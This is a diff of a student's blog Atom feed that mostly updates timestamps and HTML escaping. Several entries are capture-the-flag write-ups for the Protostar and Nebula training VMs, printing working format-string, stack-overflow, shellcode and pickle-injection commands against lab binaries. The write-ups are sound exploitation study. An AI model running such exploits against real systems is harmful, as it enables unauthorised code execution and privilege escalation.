@@ -4,7 +4,7 @@
   <title><![CDATA[Louis Li]]></title>
   <link href="http://louisrli.github.io/atom.xml" rel="self"/>
   <link href="http://louisrli.github.io/"/>
-  <updated>2013-12-06T19:30:51-05:00</updated>
+  <updated>2013-12-29T19:08:02-08:00</updated>
   <id>http://louisrli.github.io/</id>
   <author>
     <name><![CDATA[Louis Li]]></name>
@@ -14,9 +14,18 @@
 
   
   <entry>
+    <title type="html"><![CDATA[Research Reflection: My First Conference]]></title>
+    <link href="http://louisrli.github.io/blog/2013/10/23/research-recap/"/>
+    <updated>2013-10-23T00:00:00-07:00</updated>
+    <id>http://louisrli.github.io/blog/2013/10/23/research-recap</id>
+    <content type="html"><![CDATA[
+]]></content>
+  </entry>
+  
+  <entry>
     <title type="html"><![CDATA[Hungrier: Harvard Dining Menu, Re-released]]></title>
     <link href="http://louisrli.github.io/blog/2013/08/22/hungry-revamped/"/>
-    <updated>2013-08-22T00:00:00-04:00</updated>
+    <updated>2013-08-22T00:00:00-07:00</updated>
     <id>http://louisrli.github.io/blog/2013/08/22/hungry-revamped</id>
     <content type="html"><![CDATA[<p>I&rsquo;ve rewritten and redesigned <a href="http://louisrli.github.io/hungry/">Hungry</a>, a site that filters the noisy Harvard dining menu for relevant entries. If you&rsquo;re reading this during the school year, there probably won&rsquo;t be anything, since student dining isn&rsquo;t open.</p>
 
@@ -29,7 +38,7 @@
   <entry>
     <title type="html"><![CDATA[How To Use Meteor.js Routing with Disqus]]></title>
     <link href="http://louisrli.github.io/blog/2013/07/29/using-meteor-js-with-disqus/"/>
-    <updated>2013-07-29T00:00:00-04:00</updated>
+    <updated>2013-07-29T00:00:00-07:00</updated>
     <id>http://louisrli.github.io/blog/2013/07/29/using-meteor-js-with-disqus</id>
     <content type="html"><![CDATA[<p>On most sites, using Disqus as the commenting system is as simple as copying the <a href="http://disqus.com/admin/universalcode/">Universal Code</a> (also known as <code>embed.js</code>) into a web page. In single-page JavaScript applications, however, much of the rendering is on the client-side. This means that <code>embed.js</code> might lead to stale Disqus threads or function incorrectly as pages are re-rendered.</p>
 
@@ -221,7 +230,7 @@ about appending an element to <code>null</code>.</li>
   <entry>
     <title type="html"><![CDATA[Five Research Tips for First-Time Undergraduate Researchers]]></title>
     <link href="http://louisrli.github.io/blog/2013/06/28/researchtips/"/>
-    <updated>2013-06-28T00:00:00-04:00</updated>
+    <updated>2013-06-28T00:00:00-07:00</updated>
     <id>http://louisrli.github.io/blog/2013/06/28/researchtips</id>
     <content type="html"><![CDATA[<p>Today, I submitted my first extended abstract to the ASSETS 2013 Student Research Competition. This marks my first tangible output in undergraduate research. This isn&rsquo;t quite the end of the story &mdash; I plan to continue gathering results and writing a paper for submission to CHI. It is, however, time for reflection.</p>
 
@@ -289,7 +298,7 @@ about appending an element to <code>null</code>.</li>
   <entry>
     <title type="html"><![CDATA[Sophomore Spring: A Brief List of What I Learned]]></title>
     <link href="http://louisrli.github.io/blog/2013/05/13/what-i-learned-this-semester/"/>
-    <updated>2013-05-13T00:00:00-04:00</updated>
+    <updated>2013-05-13T00:00:00-07:00</updated>
     <id>http://louisrli.github.io/blog/2013/05/13/what-i-learned-this-semester</id>
     <content type="html"><![CDATA[<p>Here&rsquo;s a concise list of [some of] the things that I learned this semester. I would say that the things that I learned this semester are a lot more diverse than those from last semester (I&rsquo;d describe last semester as&hellip;math).</p>
 
@@ -356,7 +365,7 @@ about appending an element to <code>null</code>.</li>
   <entry>
     <title type="html"><![CDATA[Up-to-date Guide on How to Delete All Posts on Your Tumblr]]></title>
     <link href="http://louisrli.github.io/blog/2013/05/11/how-to-delete-all-tumblr-posts/"/>
-    <updated>2013-05-11T00:00:00-04:00</updated>
+    <updated>2013-05-11T00:00:00-07:00</updated>
     <id>http://louisrli.github.io/blog/2013/05/11/how-to-delete-all-tumblr-posts</id>
     <content type="html"><![CDATA[<p>One of my friends asked me how to batch delete all of the posts on a <a href="http://tumblr.com">Tumblr</a>. There are some PHP and Ruby scripts on the internet that claim to achieve this, but they seem to be outdated in regards to the Tumblr API, or they require installing some packages.</p>
 
@@ -371,13 +380,9 @@ about appending an element to <code>null</code>.</li>
 <li>On the right side of the Tumblr dashboard, click <strong>Posts</strong> underneath the name of your blog.</li>
 <li>This should bring up a link called <strong>Mass Post Editor</strong>. Click on <strong>Mass Post Editor</strong>.</li>
 <li>You&rsquo;ll be presented with your posts as tiles. <strong>Keep scrolling down</strong> until at least 100 posts (eyeball it) appear on the screen.</li>
-<li><p>Paste the code snippet below in the URL bar. There will be no visible changes. <strong>NOTE:</strong> Some browsers will remove the <code>javascript:</code> in front of it. Double check that it&rsquo;s still there, and if not, type <code>javascript:</code> at the beginning of the pasted part.</p>
+<li><p>Paste the code snippet below in the URL bar. It should select the first 100 posts with checkmarks. <strong>NOTE:</strong> Some browsers will remove the <code>javascript:</code> in front of it. Double check that it&rsquo;s still there, and if not, type <code>javascript:</code> at the beginning of the pasted part.</p>
 
-<pre><code>  javascript:if(!window.protolicious)(function(d,s){s=d.createElement('script');s.src='https://raw.github.com/kangax/protolicious/master/event.simulate.js';(d.head||d.documentElement).appendChild(s)})(document); 
-</code></pre></li>
-<li><p>Paste the code snippet below in the URL bar. It should select the first 100 posts with checkmarks.</p>
-
-<pre><code>  javascript:$$('.overlay').slice(0, 100).each(function(a) { a.simulate('click'); }); 
+<pre><code>  javascript:$('.overlay').slice(0, 100).click()
 </code></pre></li>
 <li><p>Click <strong>Delete selected posts</strong>.</p></li>
 <li>Refresh the page if needed, and delete another 100 posts!</li>
@@ -386,18 +391,18 @@ about appending an element to <code>null</code>.</li>
 
 <p>If for some reason this doesn&rsquo;t work, let me know in the comments. I&rsquo;ll try to keep this up-to-date.</p>
 
+<p>Last updated: December 29, 2013</p>
+
 <h2>Technical Details</h2>
 
-<p>Tumblr uses the Javascript library <a href="http://prototypejs.org/">Prototype</a>. Unlike jQuery, this doesn&rsquo;t provide a lot of support for handling and simulating events, so we load some library (I&rsquo;m not familiar with Prototype, although I briefly read the docs out of curiosity) called <a href="https://github.com/kangax/protolicious">Protolicious</a> that adds some support for this.</p>
-
-<p>Prototype is already included on the page, since Tumblr uses it. The code loads the Protolicious library, finds the first 100 posts, and clicks on them.</p>
+<p>Tumblr now uses <a href="http://jquery.org">jQuery</a>. An older version of this post loaded the <a href="https://github.com/kangax/protolicious">Protolicious</a> library, but some time between May 2013 and December 2013, Tumblr switched JavaScript libraries.</p>
 ]]></content>
   </entry>
   
   <entry>
     <title type="html"><![CDATA[A Rational Approximation of Pi Using the Pigeonhole Principle]]></title>
     <link href="http://louisrli.github.io/blog/2013/01/31/approximating-pi-pigeonhole-principle/"/>
-    <updated>2013-01-31T00:00:00-05:00</updated>
+    <updated>2013-01-31T00:00:00-08:00</updated>
     <id>http://louisrli.github.io/blog/2013/01/31/approximating-pi-pigeonhole-principle</id>
     <content type="html"><![CDATA[<p>Below is a short Python script that finds a fractional approximation of \(\pi\) using the first 1001 multiples of \(\pi\) (the case with 11 multiples of \(\pi\) can easily be done by hand). It makes use of the <em>pigeonhole principle</em>. The 11-multiple version of the problem has been used in the module teaching the pigeonhole principle in various classes that I have taken or taught.</p>
 
@@ -527,7 +532,7 @@ about appending an element to <code>null</code>.</li>
   <entry>
     <title type="html"><![CDATA[Chrome Extensions: Taking Screenshots with Javascript/jQuery, HTML5, Canvas]]></title>
     <link href="http://louisrli.github.io/blog/2013/01/16/javascript-canvas-screenshot/"/>
-    <updated>2013-01-16T00:00:00-05:00</updated>
+    <updated>2013-01-16T00:00:00-08:00</updated>
     <id>http://louisrli.github.io/blog/2013/01/16/javascript-canvas-screenshot</id>
     <content type="html"><![CDATA[<p>This post describes how to create a completely accurate image preview of a DOM element on the page by using Javascript in a Chrome extension. I stumbled upon this issue while working on a web implementation of <a href="http://www.mendeley.com/research/enhanced-area-cursors-reducing-fine-pointing-demands-people-motor-impairments/">click-and-cross (Findlater et al.)</a> for research. This process consists of two subproblems.</p>
 
@@ -586,7 +591,7 @@ about appending an element to <code>null</code>.</li>
 
 <div>
   <pre><code class='javascript'>chrome.extension.onMessage.addListener(function(request, sender, sendResponse) {
-    if (request.name == 'screenshot') {
+    if (request.name == &#39;screenshot&#39;) {
         chrome.tabs.captureVisibleTab(null, null, function(dataUrl) {
             sendResponse({ screenshotUrl: dataUrl });
         });
@@ -601,9 +606,9 @@ about appending an element to <code>null</code>.</li>
 <div>
   <pre><code class='javascript'>/* Takes a screenshot and uses it in a callback as a canvas */
 takeScreenshot: function(callback) {
-    chrome.extension.sendMessage({name: 'screenshot'}, function(response) {
+    chrome.extension.sendMessage({name: &#39;screenshot&#39;}, function(response) {
         var data = response.screenshotUrl;
-        var canvas = document.createElement('canvas');
+        var canvas = document.createElement(&#39;canvas&#39;);
         var img = new Image();
         img.onload = function() {
             canvas.width = $(window).width();
@@ -611,8 +616,8 @@ takeScreenshot: function(callback) {
             canvas.getContext(&quot;2d&quot;).drawImage(img, 0, 0, canvas.width, canvas.height);
 
             var $canvas = $(canvas);
-            $canvas.data('scrollLeft', $(document.body).scrollLeft());
-            $canvas.data('scrollTop', $(document.body).scrollTop());
+            $canvas.data(&#39;scrollLeft&#39;, $(document.body).scrollLeft());
+            $canvas.data(&#39;scrollTop&#39;, $(document.body).scrollTop());
 
             // Perform callback after image loads
             callback($canvas);
@@ -628,13 +633,13 @@ takeScreenshot: function(callback) {
 <div>
   <pre><code class='javascript'>/* Returns a canvas containing a screenshot of $element */
 renderPreview: function($element, $screenshotCanvas) {
-    var previewCanvas = document.createElement('canvas');
+    var previewCanvas = document.createElement(&#39;canvas&#39;);
     previewCanvas.width = $element.width();
     previewCanvas.height = $element.height();
 
     // Calculate the correct position of the element on the canvas
-    var prevTop = $element.offset().top - $screenshotCanvas.data('scrollTop');
-    var prevLeft = $element.offset().left - $screenshotCanvas.data('scrollLeft');
+    var prevTop = $element.offset().top - $screenshotCanvas.data(&#39;scrollTop&#39;);
+    var prevLeft = $element.offset().left - $screenshotCanvas.data(&#39;scrollLeft&#39;);
 
     var ctx = previewCanvas.getContext(&quot;2d&quot;);
     ctx.drawImage($screenshotCanvas[0], prevLeft, prevTop,
@@ -643,7 +648,7 @@ renderPreview: function($element, $screenshotCanvas) {
                                         $element.width(), $element.height());
 
     return $(previewCanvas)
-                .css({ border:'1px solid black' });
+                .css({ border:&#39;1px solid black&#39; });
 }</code></pre>
 </div>
 
@@ -693,7 +698,7 @@ renderPreview: function($element, $screenshotCanvas) {
   <entry>
     <title type="html"><![CDATA[Using Quicksilver Mac and AppleScript to Adjust System Volume]]></title>
     <link href="http://louisrli.github.io/blog/2013/01/15/applescript-volume/"/>
-    <updated>2013-01-15T00:00:00-05:00</updated>
+    <updated>2013-01-15T00:00:00-08:00</updated>
     <id>http://louisrli.github.io/blog/2013/01/15/applescript-volume</id>
     <content type="html"><![CDATA[<p>I&rsquo;ve been using <a href="http://qsapp.com/">Quicksilver</a> for a while, and I&rsquo;d heard of how powerful but never taken advantage of it. I wanted to adjust the system volume through Quicksilver: right now, I have to use <code>fn</code> + <code>f10</code> / <code>f11</code> / <code>f12</code> to adjust volume, since I chose to have <code>f1</code>&ndash;<code>f12</code> map to the normal keys.</p>
 
@@ -760,7 +765,7 @@ set volume output muted not isMuted</code></pre>
   <entry>
     <title type="html"><![CDATA[2012 in Sideprojects]]></title>
     <link href="http://louisrli.github.io/blog/2013/01/12/sideprojects-2012/"/>
-    <updated>2013-01-12T00:00:00-05:00</updated>
+    <updated>2013-01-12T00:00:00-08:00</updated>
     <id>http://louisrli.github.io/blog/2013/01/12/sideprojects-2012</id>
     <content type="html"><![CDATA[<p>It always surprises me how long a year is. It&rsquo;s hard for me to believe that some of these projects were a year ago, but I&rsquo;m happy to see my progress. Here&rsquo;s a walk down memory lane for my projects in 2012, not including course projects and research.</p>
 
@@ -889,7 +894,7 @@ set volume output muted not isMuted</code></pre>
   <entry>
     <title type="html"><![CDATA[Looking Forward to Discrete Mathematics]]></title>
     <link href="http://louisrli.github.io/blog/2012/12/22/discrete-math-paper/"/>
-    <updated>2012-12-22T00:00:00-05:00</updated>
+    <updated>2012-12-22T00:00:00-08:00</updated>
     <id>http://louisrli.github.io/blog/2012/12/22/discrete-math-paper</id>
     <content type="html"><![CDATA[<p>For one of my math classes this semester (Sets and Topology), we had a short project: a three-to-five page paper on some area in mathematics. I opted for discrete mathematics, which is a topic on the broad side; five pages, of course.</p>
 
@@ -911,7 +916,7 @@ set volume output muted not isMuted</code></pre>
   <entry>
     <title type="html"><![CDATA[Enabling VirtualBox SSH on IPv6 (Linux host, Linux guest)]]></title>
     <link href="http://louisrli.github.io/blog/2012/08/30/virtualbox-ipv6-ssh/"/>
-    <updated>2012-08-30T00:00:00-04:00</updated>
+    <updated>2012-08-30T00:00:00-07:00</updated>
     <id>http://louisrli.github.io/blog/2012/08/30/virtualbox-ipv6-ssh</id>
     <content type="html"><![CDATA[<p>This is a quick article describing how to SSH to a VirtualBox machine from the host machine, written for VirtualBox 4.1.18 Fedora. The standard choice &mdash; bridged networking &mdash; doesn&rsquo;t work when the host has an IPv6 address.</p>
 
@@ -1001,7 +1006,7 @@ TX packets:4691 errors:0 dropped:0 overruns:0 carrier:0</code></pre>
   <entry>
     <title type="html"><![CDATA[Protostar Format String Exploits (Solutions 0-4)]]></title>
     <link href="http://louisrli.github.io/blog/2012/08/29/protostar-format0/"/>
-    <updated>2012-08-29T00:00:00-04:00</updated>
+    <updated>2012-08-29T00:00:00-07:00</updated>
     <id>http://louisrli.github.io/blog/2012/08/29/protostar-format0</id>
     <content type="html"><![CDATA[<h1>Overview</h1>
 
@@ -1018,7 +1023,7 @@ TX packets:4691 errors:0 dropped:0 overruns:0 carrier:0</code></pre>
 <p>This exploit shows similarities (sometimes) between format string exploits and buffer overflows.</p>
 
 <div>
-  <pre><code class='console'>$ ./format0 %64s$(perl -e 'print &quot;\xef\xbe\xad\xde&quot;')
+  <pre><code class='console'>$ ./format0 %64s$(perl -e &#39;print &quot;\xef\xbe\xad\xde&quot;&#39;)
 
 you have hit the target correctly :)</code></pre>
 </div>
@@ -1090,7 +1095,7 @@ in printf.c
 <p>With a few calculations, we can find the correct offset.</p>
 
 <div>
-  <pre><code class='console'>$ ./format1 $(perl -e 'print &quot;\x38\x96\x04\x08&quot;')'..%128$n'
+  <pre><code class='console'>$ ./format1 $(perl -e &#39;print &quot;\x38\x96\x04\x08&quot;&#39;)&#39;..%128$n&#39;
 8..you have modified the target :)</code></pre>
 </div>
 
@@ -1108,7 +1113,7 @@ in printf.c
 <p>Using the same techniques as before, we find the beginning of the format string in memory. The fourth expected format string argument coincides with the beginning of the format string in memory. We store our target address at the beginning of the format string in order to write to it.</p>
 
 <div>
-  <pre><code class='console'>$ echo -ne $(perl -e 'print &quot;\xe4\x96\x04\x08&quot;')%4\$08x | ./format2
+  <pre><code class='console'>$ echo -ne $(perl -e &#39;print &quot;\xe4\x96\x04\x08&quot;&#39;)%4\$08x | ./format2
 080496e4target is 0 :(</code></pre>
 </div>
 
@@ -1116,7 +1121,7 @@ in printf.c
 <p>Finally, we calculate the number of bytes needed to write 64 (0x40). The address of <code>target</code> occupies four bytes first, and we need another 60 bytes.</p>
 
 <div>
-  <pre><code class='console'>$ echo -ne $(perl -e 'print &quot;\xe4\x96\x04\x08&quot;')%60u%4\$n | ./format2
+  <pre><code class='console'>$ echo -ne $(perl -e &#39;print &quot;\xe4\x96\x04\x08&quot;&#39;)%60u%4\$n | ./format2
                                                          512you have modified the target :)</code></pre>
 </div>
 
@@ -1148,7 +1153,7 @@ eip = 0xb7edcfa2 in __printf (printf.c:29); saved eip 0x8048465
 called by frame at 0xbffff590
 source language c.
 Arglist at 0xbffff568, args: format=0xbffff5a0 &quot;AAAA\n&quot;
-Locals at 0xbffff568, Previous frame's sp is 0xbffff570
+Locals at 0xbffff568, Previous frame&#39;s sp is 0xbffff570
 Saved registers:
 ebx at 0xbffff564, ebp at 0xbffff568, eip at 0xbffff56c
 (gdb) x/3xw 0xbffff568
@@ -1186,7 +1191,7 @@ $ echo &quot;ibase=16; 01&quot; | bc
 <p>Finally, we write values to each of the four bytes of <code>target</code>:</p>
 
 <div>
-  <pre><code class='console'>$ echo $(perl -e 'print &quot;\xf4\x96\x04\x08&quot;')$(perl -e 'print &quot;\xf5\x96\x04\x08&quot;')$(perl -e 'print &quot;\xf6\x96\x04\x08&quot;')$(perl -e 'print &quot;\xf7\x96\x04\x08&quot;')'%52u%12$n%''17u%13$n''%173u%14$n' | ./format3
+  <pre><code class='console'>$ echo $(perl -e &#39;print &quot;\xf4\x96\x04\x08&quot;&#39;)$(perl -e &#39;print &quot;\xf5\x96\x04\x08&quot;&#39;)$(perl -e &#39;print &quot;\xf6\x96\x04\x08&quot;&#39;)$(perl -e &#39;print &quot;\xf7\x96\x04\x08&quot;&#39;)&#39;%52u%12$n%&#39;&#39;17u%13$n&#39;&#39;%173u%14$n&#39; | ./format3
 ���                                                   0       3221222848                                                                                                                                                                   3086839796
 you have modified the target :))</code></pre>
 </div>
@@ -1201,7 +1206,7 @@ you have modified the target :))</code></pre>
 <p>In this exercise, the offset is only 16 bytes (four parameter arguments). The calculation is omitted as the two previous exercises illustrate the process.</p>
 
 <div>
-  <pre><code class='console'>$ echo 'AAAA%4$x' | ./format4
+  <pre><code class='console'>$ echo &#39;AAAA%4$x&#39; | ./format4
 AAAA41414141</code></pre>
 </div>
 
@@ -1222,7 +1227,7 @@ $ objdump -t format4 | grep hello
 <p>To confirm that our overwrite works correctly, we run a quick test:</p>
 
 <div>
-  <pre><code class='console'>$ echo $(perl -e 'print &quot;\x24\x97\x04\x08&quot;')'%4$n' &gt; /tmp/format4
+  <pre><code class='console'>$ echo $(perl -e &#39;print &quot;\x24\x97\x04\x08&quot;&#39;)&#39;%4$n&#39; &gt; /tmp/format4
 $ gdb -q format4
 Reading symbols from /opt/protostar/bin/format4...done.
 (gdb) run &lt; /tmp/format4
@@ -1236,7 +1241,7 @@ Program received signal SIGSEGV, Segmentation fault.
 <p>Execution jumped to the address <code>0x00000004</code>, meaning that we&rsquo;re on the right track. Finally, we use a <strong>short write</strong> (<code>%hn</code>, allowing us to write to two bytes) to overwrite the last two bytes of the GOT entry. This works because both addresses start with <code>0x0804</code> &mdash; only the last two bytes need to be changed.</p>
 
 <div>
-  <pre><code class='console'>$ echo $(perl -e 'print &quot;\x24\x97\x04\x08&quot;')'%33968u%4$hn' | ./format4
+  <pre><code class='console'>$ echo $(perl -e &#39;print &quot;\x24\x97\x04\x08&quot;&#39;)&#39;%33968u%4$hn&#39; | ./format4
 $
 &lt;lots of whitespace&gt;
 512
@@ -1251,7 +1256,7 @@ $
   <entry>
     <title type="html"><![CDATA[Protostar Stack Exploits (Solutions 6-7)]]></title>
     <link href="http://louisrli.github.io/blog/2012/08/28/protostar-stack2/"/>
-    <updated>2012-08-28T00:00:00-04:00</updated>
+    <updated>2012-08-28T00:00:00-07:00</updated>
     <id>http://louisrli.github.io/blog/2012/08/28/protostar-stack2</id>
     <content type="html"><![CDATA[<h1>Overview</h1>
 
@@ -1279,7 +1284,7 @@ if [[ $# -lt 2 ]]; then
     exit 1
 fi
 
-perl -e &quot;print 'A'x$1&quot;
+perl -e &quot;print &#39;A&#39;x$1&quot;
 shift
 for addr in $@; do
     for i in $(seq 8 -2 2); do echo -ne &quot;\x${addr:$i:2}&quot;; done
@@ -1534,7 +1539,7 @@ root</code></pre>
   <entry>
     <title type="html"><![CDATA[Protostar Stack Exploits (Solutions 4-5)]]></title>
     <link href="http://louisrli.github.io/blog/2012/08/24/protostar-stack1/"/>
-    <updated>2012-08-24T00:00:00-04:00</updated>
+    <updated>2012-08-24T00:00:00-07:00</updated>
     <id>http://louisrli.github.io/blog/2012/08/24/protostar-stack1</id>
     <content type="html"><![CDATA[<h1>Overview</h1>
 
@@ -1577,7 +1582,7 @@ Stack level 0, frame at 0xbffff7d0:
 eip = 0x804841d in main (stack4/stack4.c:16); saved eip 0xb7eacc76
 source language c.
 Arglist at 0xbffff7c8, args: argc=1, argv=0xbffff874
-Locals at 0xbffff7c8, Previous frame's sp is 0xbffff7d0
+Locals at 0xbffff7c8, Previous frame&#39;s sp is 0xbffff7d0
 Saved registers:
 ebp at 0xbffff7c8, eip at 0xbffff7cc
 (gdb) x/32xw $esp
@@ -1605,7 +1610,7 @@ Using the offset calculated above, <code>eip</code> is redirected to the address
 
 
 <div>
-  <pre><code class='console'>$ echo -e &quot;$(perl -e &quot;print 'A'x76&quot;)\xf4\x83\x04\x08&quot; | ./stack4
+  <pre><code class='console'>$ echo -e &quot;$(perl -e &quot;print &#39;A&#39;x76&quot;)\xf4\x83\x04\x08&quot; | ./stack4
 code flow successfully changed
 Segmentation fault</code></pre>
 </div>
@@ -1689,14 +1694,14 @@ int 0x80</code></pre>
   <pre><code class='console'>$ export SC=$(echo -n $(~/nop 100)$(cat /home/user/shell))
 $ ~/envaddr SC
 SC is at address 0xbffffefa
-$ echo -n $(perl -e 'print &quot;\xfa\xfe\xff\xbf&quot;x25') | /opt/protostar/bin/stack5</code></pre>
+$ echo -n $(perl -e &#39;print &quot;\xfa\xfe\xff\xbf&quot;x25&#39;) | /opt/protostar/bin/stack5</code></pre>
 </div>
 
 
 <p>Nothing happened! Let&rsquo;s take a look with GDB.</p>
 
 <div>
-  <pre><code class='text'>[user@protostar:~]$ echo -n $(perl -e 'print &quot;\xfa\xfe\xff\xbf&quot;x25') &gt; /tmp/sc-shell
+  <pre><code class='text'>[user@protostar:~]$ echo -n $(perl -e &#39;print &quot;\xfa\xfe\xff\xbf&quot;x25&#39;) &gt; /tmp/sc-shell
 [user@protostar:~]$ gdb /opt/protostar/bin/stack5
 Reading symbols from /opt/protostar/bin/stack5...done.
 (gdb) run &lt; /tmp/sc-shell
@@ -1720,7 +1725,7 @@ Program exited normally.</code></pre>
 $ export SC=$(echo -ne $(~/nop 100)$(cat /home/user/sc-nc-8080))
 $ ~/envaddr SC
 SC is at address 0xbffffece
-$ echo -n $(perl -e 'print &quot;\xce\xfe\xff\xbf&quot;x25') | /opt/protostar/bin/stack5
+$ echo -n $(perl -e &#39;print &quot;\xce\xfe\xff\xbf&quot;x25&#39;) | /opt/protostar/bin/stack5
 &lt;waiting&gt;</code></pre>
 </div>
 
@@ -1741,7 +1746,7 @@ root</code></pre>
   <entry>
     <title type="html"><![CDATA[Protostar Stack Exploits (Solutions 0-3)]]></title>
     <link href="http://louisrli.github.io/blog/2012/08/18/protostar-stack0/"/>
-    <updated>2012-08-18T00:00:00-04:00</updated>
+    <updated>2012-08-18T00:00:00-07:00</updated>
     <id>http://louisrli.github.io/blog/2012/08/18/protostar-stack0</id>
     <content type="html"><![CDATA[<h1>Overview</h1>
 
@@ -1758,8 +1763,8 @@ root</code></pre>
 <p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack0">full</a>): Overwrite a variable on the stack.</p>
 
 <div>
-  <pre><code class='console'>$ perl -e &quot;print 'a'x65&quot; | ./stack0
-you have changed the 'modified' variable</code></pre>
+  <pre><code class='console'>$ perl -e &quot;print &#39;a&#39;x65&quot; | ./stack0
+you have changed the &#39;modified&#39; variable</code></pre>
 </div>
 
 
@@ -1768,7 +1773,7 @@ you have changed the 'modified' variable</code></pre>
 <p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack1">full</a>): Overwrite a variable on the stack with a specific series of hex values.</p>
 
 <div>
-  <pre><code class='console'>$ ./stack1 $(perl -e &quot;print 'a'x64 . dcba&quot;)
+  <pre><code class='console'>$ ./stack1 $(perl -e &quot;print &#39;a&#39;x64 . dcba&quot;)
 you have correctly got the variable to the right value</code></pre>
 </div>
 
@@ -1796,7 +1801,7 @@ you have correctly modified the variable</code></pre>
 <div>
   <pre><code class='console'>$ objdump -d ./stack3 | grep win
 08048424 &lt;win&gt;:
-$ echo -e &quot;$(perl -e &quot;print 'a'x64&quot;)\x24\x84\x04\x08&quot; | ./stack3
+$ echo -e &quot;$(perl -e &quot;print &#39;a&#39;x64&quot;)\x24\x84\x04\x08&quot; | ./stack3
 calling function pointer, jumping to 08048424
 code flow successfully changed</code></pre>
 </div>
@@ -1809,7 +1814,7 @@ code flow successfully changed</code></pre>
   <entry>
     <title type="html"><![CDATA[Nebula Shell Exploits (Solutions 15-19)]]></title>
     <link href="http://louisrli.github.io/blog/2012/08/17/nebula2/"/>
-    <updated>2012-08-17T00:00:00-04:00</updated>
+    <updated>2012-08-17T00:00:00-07:00</updated>
     <id>http://louisrli.github.io/blog/2012/08/17/nebula2</id>
     <content type="html"><![CDATA[<h1>Overview</h1>
 
@@ -1886,7 +1891,7 @@ cat /home/flag15/getflag.log</code></pre>
 #include &lt;sys/syscall.h&gt;
 #include &lt;unistd.h&gt;
 
-// If this isn't here, we have an error about a missing symbol
+// If this isn&#39;t here, we have an error about a missing symbol
 void __cxa_finalize(void *d) {
     return;
 }
@@ -1945,7 +1950,7 @@ getflag &gt; /home/flag16/getflag.log</code></pre>
 
 
 <div>
-  <pre><code class='console'>$ ~/curl ' &quot;`/*/RUN` %00 '
+  <pre><code class='console'>$ ~/curl &#39; &quot;`/*/RUN` %00 &#39;
 $ cat /home/flag16/getflag.log
 You have successfully executed getflag on a target account</code></pre>
 </div>
@@ -1966,7 +1971,7 @@ You have successfully executed getflag on a target account</code></pre>
 <div>
   <pre><code class='text'>cos
 system
-(S' /tmp/run17'
+(S&#39; /tmp/run17&#39;
 tR.</code></pre>
 </div>
 
@@ -2169,7 +2174,7 @@ uid=1020(level19) ...</code></pre>
   <entry>
     <title type="html"><![CDATA[Wrapping up the summer]]></title>
     <link href="http://louisrli.github.io/blog/2012/07/12/scala-and-summer/"/>
-    <updated>2012-07-12T00:00:00-04:00</updated>
+    <updated>2012-07-12T00:00:00-07:00</updated>
     <id>http://louisrli.github.io/blog/2012/07/12/scala-and-summer</id>
     <content type="html"><![CDATA[<p>It&rsquo;s one of those posts that relates to everyone, but it had been on the edge of my mind recently. This post, titled the &ldquo;<a href="http://tilomitra.com/the-crazy-world-of-code">Crazy World of Code</a>&rdquo;, appeared on Hacker News a few days ago. It references a comment on a different HN article.</p>
 
@@ -2207,7 +2212,7 @@ uid=1020(level19) ...</code></pre>
   <entry>
     <title type="html"><![CDATA[The Beginning of Systems]]></title>
     <link href="http://louisrli.github.io/blog/2012/07/08/systems-prog/"/>
-    <updated>2012-07-08T00:00:00-04:00</updated>
+    <updated>2012-07-08T00:00:00-07:00</updated>
     <id>http://louisrli.github.io/blog/2012/07/08/systems-prog</id>
     <content type="html"><![CDATA[<p>That went by fast.</p>
 
@@ -2227,7 +2232,7 @@ uid=1020(level19) ...</code></pre>
   <entry>
     <title type="html"><![CDATA[Nebula Shell Exploits (Solutions 10-14)]]></title>
     <link href="http://louisrli.github.io/blog/2012/06/28/nebula1/"/>
-    <updated>2012-06-28T00:00:00-04:00</updated>
+    <updated>2012-06-28T00:00:00-07:00</updated>
     <id>http://louisrli.github.io/blog/2012/06/28/nebula1</id>
     <content type="html"><![CDATA[<h1>Overview</h1>
 
@@ -2244,7 +2249,7 @@ uid=1020(level19) ...</code></pre>
 Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so
 using open(2) creates a security hole, because the user might exploit the short time interval between
 checking and opening the file to manipulate it. For this reason, the use of this system call should be
-avoided. (In the example just described, a safer alternative would be to temporarily switch the process's
+avoided. (In the example just described, a safer alternative would be to temporarily switch the process&#39;s
 effective user ID to the real ID and then call open(2).)</code></pre>
 </div>
 
@@ -2313,9 +2318,9 @@ $ echo &quot;Content-Length: 1\n\c&quot; &gt; ./foo
 $ echo &quot;getflag; whoami&quot; &gt; ./b
 $ export PATH=~:$PATH
 $ /home/flag11/flag11 &lt; ~/foo
-sh: $'b\200\263': command not found
+sh: $&#39;b\200\263&#39;: command not found
 $ /home/flag11/flag11 &lt; ~/foo
-sh: $'b\300\241': command not found
+sh: $&#39;b\300\241&#39;: command not found
 $ /home/flag11/flag11 &lt; ~/foo
 You have successfully executed getflag on a target account
 flag11</code></pre>
@@ -2431,9 +2436,9 @@ You have successfully executed getflag on a target account</code></pre>
 <div>
   <pre><code class='console'>$ echo $UID
 1014
-$ printf '%x\n' 1014 # Our uid in hex
+$ printf &#39;%x\n&#39; 1014 # Our uid in hex
 3f6
-$ printf '%x\n' 1000 # FAKEUID in hex
+$ printf &#39;%x\n&#39; 1000 # FAKEUID in hex
 3e8
 $ objdump -d flag13 | grep 3e8
 80484f4:        3d e8 03 00 00      cmp     __$0x3e8__,%eax
@@ -2514,224 +2519,6 @@ You have successfully executed getflag on a target account</code></pre>
 
 
 
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Nebula Shell Exploits (Solutions 00-09)]]></title>
-    <link href="http://louisrli.github.io/blog/2012/06/22/nebula0/"/>
-    <updated>2012-06-22T00:00:00-04:00</updated>
-    <id>http://louisrli.github.io/blog/2012/06/22/nebula0</id>
-    <content type="html"><![CDATA[<h1>Overview</h1>
-
-<p>Nebula is a series of &ldquo;capture the flag&rdquo; exercises from <a href="http://exploit-exercises.com/nebula">Exploit Exercises</a>. I&rsquo;ve been reading <a href="http://www.amazon.com/Hacking-The-Art-Exploitation-Edition/dp/1593271441/">Hacking: The Art of Exploitation 2e</a> &mdash; this was a good supplement.</p>
-
-<p>The provided Ubuntu VM has 20 levels (00 &ndash; 19). The goal of each level is to run the <code>getflag</code> command on a target account, either by exploiting a <a href="http://en.wikipedia.org/wiki/Setuid">suid</a> program or obtaining the password.</p>
-
-<h1>Solutions</h1>
-
-<p>To keep things shorter, a link to the full description is provided with each level. The full description contains relevant source code.</p>
-
